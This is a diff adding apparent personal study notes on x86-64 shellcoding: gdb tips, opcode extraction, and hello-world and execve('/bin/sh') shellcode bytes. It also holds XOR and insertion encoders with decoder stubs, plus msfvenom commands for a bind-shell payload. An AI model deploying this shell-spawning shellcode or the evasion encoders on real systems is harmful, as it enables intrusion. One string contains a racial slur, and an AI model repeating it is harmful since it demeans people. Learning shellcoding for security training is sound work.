@@ -1,0 +1,243 @@
+gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
+
+(Checking for any stack protection is there)
+(-z execstack -> Checking if stack is exec)
+
+
+break main
+
+layout asm
+
+
+for i in $(objdump -M intel -D Exit1.o | grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
+
+
+\x48\x31\xc0\xb0\x3c\x48\x31\xff\x0f\x05 
+
+\x48\x31\xc0\x48\x89\xc7\x04\x3c\x0f\x05
+
+
+\xeb\x1e\x5e\x48\x31\xc0\xb0\x01\x48\x89\xc7\x48\x89\xfa\x48\x83\xc2\x22\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05\xe8\xdd\xff\xff\xff\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x20\x74\x6f\x20\x74\x68\x65\x20\x53\x4c\x41\x45\x2d\x36\x34\x20\x43\x6f\x75\x72\x73\x65\x0a
+
+-------------------------------------------------------------------
+
+JUMp -> CALL -> POP
+
+-----------------------------
+
+Using Stack for Shellcode :
+
+lylang/shellcode-basics# python
+Python 2.7.12 (default, Nov 19 2016, 06:48:10) 
+[GCC 5.4.0 20160609] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> 
+>>> banner = 'Hello World\n'
+>>> 
+>>> len(banner)
+12
+>>> 
+>>> banner[::-1]
+'\ndlroW olleH'
+>>> 
+>>> 
+>>> banner[::-1].encode('hex')
+'0a646c726f57206f6c6c6548'
+
+
+----------------------------------------------
+
+\x48\x31\xc0\x48\x83\xc0\x01\x48\x89\xc7\x68\x72\x6c\x64\x0a\x48\xbb\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x53\x48\x89\xe6\x48\x31\xd2\x48\x83\xc2\x0c\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05
+
+==========================================================
+
+RIP :
+
+rip is used in x64 bit only using keyword
+
+DEFAULT rel
+
+lea rsi,[rel variable]
+
+ex:
+
+lea rsi,[rel hello_world]
+
+
+hello_word: db 'Hello World Hack',0xa
+
+--------------------------
+RIP
+
+\x48\x31\xc0\x48\x83\xc0\x01\x48\x89\xc7\x48\x8d\x35\x15\x00\x00\x00\x48\x31\xd2\x48\x83\xc2\x0e\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x20\x4e\x69\x67\x67\x61\x0a
+
+
+============================================================
+========================================
+================================
+
+Execve:
+
+Syntax:
+
+#include <unistd.h>
+
+int execve(const char *filename, char *const argv[],  char *const envp[]);
+           --------------------  --------------------  ----------------------------------
+		/bin/sh,0x0		0x0000000000	address of /bin/sh,0x000000000000
+			RDI			RDX		RSI
+
+
+===========================================================
+
+define hook-stop
+
+x/5xg $rsp
+end
+
+----------------------------------------------------
+
+GDB Command :
+
+SUppose we used .c file in gdb to analyze
+
+gdb ./shellcode -tui
+
+we need to set break point here
+
+suppose
+
+code[]="SHELLCODER HERE"
+
+
+for this
+
+use :
+
+
+break &*code
+
+-------------------------------------------------------------
+
+XOR ENCODERS :
+
+Writing XOR Encoders and decoder stubs,
+
+
+
+Original Shellcode 
+
+0x12 0xab 0xac 0x01
+
+      XOR
+0xaa 0xaa 0xaa 0xaa
+----------------------
+0xb8 0x01 0x06 0xab
+
+
+
+
+(a xor b) xor b = a
+
+
+Xoring our shellcode with 0xaa 0xaa 0xaa etc to get encoded shellcode
+
+Original:
+
+\xeb\x1d\x48\x31\xc0\x5f\x88\x67\x07\x48\x89\x7f\x08\x48\x89\x47\x10\x48\x8d\x77\x08\x48\x8d\x57\x10\x48\x83\xc0\x3b\x0f\x05\xe8\xde\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x42\x42\x42\x42\x43\x43\x43\x43\x43\x43\x43\x43
+
+
+0x41,0xb7,0xe2,0x9b,0x6a,0xf5,0x22,0xcd,0xad,0xe2,0x23,0xd5,0xa2,0xe2,0x23,0xed,0xba,0xe2,0x27,0xdd,0xa2,0xe2,0x27,0xfd,0xba,0xe2,0x29,0x6a,0x91,0xa5,0xaf,0x42,0x74,0x55,0x55,0x55,0x85,0xc8,0xc3,0xc4,0x85,0xd9,0xc2,0xeb,0xe8,0xe8,0xe8,0xe8,0xe8,0xe8,0xe8,0xe8,0xe9,0xe9,0xe9,0xe9,0xe9,0xe9,0xe9,0xe9
+
+
+xor-decoder.nasm
+
+global _start 
+
+section .text
+
+_start:
+
+	jmp find_address
+
+decoder:
+		pop rdi; first to point the address of encoded_shellcode pop it from stack
+		xor rcx, rcx ; 0 null zf is set
+		add cl, 60 
+
+decode:
+		xor byte [rdi], 0xAA ; this tells that take the value of rdi i.e 0x41 and xor it with 0xAA
+		inc rdi ; now increase rdi from 0x41 to 0xb7
+		loop decode  ; loop all 60 rdi bytes
+
+		jump short encoded_shellcode
+
+
+find_address:
+	call decoder
+
+	encoded_shellcode: db 0x41,0xb7,0xe2,0x9b,0x6a,0xf5,0x22,0xcd,0xad,0xe2,0x23,0xd5,0xa2,0xe2,0x23,0xed,0xba,0xe2,0x27,0xdd,0xa2,0xe2,0x27,0xfd,0xba,0xe2,0x29,0x6a,0x91,0xa5,0xaf,0x42,0x74,0x55,0x55,0x55,0x85,0xc8,0xc3,0xc4,0x85,0xd9,0xc2,0xeb,0xe8,0xe8,0xe8,0xe8,0xe8,0xe8,0xe8,0xe8,0xe9,0xe9,0xe9,0xe9,0xe9,0xe9,0xe9,0xe9
+
+==========================================================================
+
+Insertion Encoder :
+
+Original Shellcode 
+
+0x12 0xab 0xac 0x01
+
+inserting new character in each byte of shellcode 
+
+ex:
+
+0x120xaa 0xab0xaa 0xac0xaa 0x0a0xaa
+
+Then Insertion Decoder stub to get original shellcode
+
+
+\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05
+
+0x48,0xaa,0x31,0xaa,0xc0,0xaa,0x50,0xaa,0x48,0xaa,0xbb,0xaa,0x2f,0xaa,0x62,0xaa,0x69,0xaa,0x6e,0xaa,0x2f,0xaa,0x2f,0xaa,0x73,0xaa,0x68,0xaa,0x53,0xaa,0x48,0xaa,0x89,0xaa,0xe7,0xaa,0x50,0xaa,0x48,0xaa,0x89,0xaa,0xe2,0xaa,0x57,0xaa,0x48,0xaa,0x89,0xaa,0xe6,0xaa,0x48,0xaa,0x83,0xaa,0xc0,0xaa,0x3b,0xaa,0x0f,0xaa,0x05,0xaa
+
+
+\xeb\x43\x48\xaa\x31\xaa\xc0\xaa\x50\xaa\x48\xaa\xbb\xaa\x2f\xaa\x62\xaa\x69\xaa\x6e\xaa\x2f\xaa\x2f\xaa\x73\xaa\x68\xaa\x53\xaa\x48\xaa\x89\xaa\xe7\xaa\x50\xaa\x48\xaa\x89\xaa\xe2\xaa\x57\xaa\x48\xaa\x89\xaa\xe6\xaa\x48\xaa\x83\xaa\xc0\xaa\x3b\xaa\x0f\xaa\x05\xbb\xbb\xbb\xbb\x48\x8d\x35\xb6\xff\xff\xff\x48\x8d\x7e\x01\x48\x31\xc0\xb0\x01\x48\x31\xdb\x8a\x1c\x06\x80\xf3\xaa\x75\xa2\x8a\x5c\x06\x01\x88\x1f\x48\xff\xc7\x04\x02\xeb\xeb
+
+
+
+
+--------------------------------------------------
+
+Metasploit :
+
+msfvenom -l payloads
+
+msfvenom -p linux/x64/shell_bind_tcp -o
+
+msfvenom -p linux/x64/shell_bind_tcp -f c
+
+msfvenom -l encoders
+
+
+using metasploit encoders to encode our shellcode :
+
+echo -ne "SHELLCODER HERE" | msfvenom -f c -e x64/xor -a x64 --platform linux
+
+-------------------------------------------------------------
+
+
+CMP = Compare
+
+INC EDX
+CMP EDX, 10 ; compares whther EDX Reached to 10
+JLE LP1; if it is less than or equal to 10 , then jump to LP1
+
+Jumps :                        FLAG:
+ 
+JE/Jz : Jump equal or zero    ZF
+JNE/JNZ : not e or z          ZF
+JG/JNLE : Greator or not less /equal
+JGE/JNL : Jump greater equal / not less
+
+
+
+
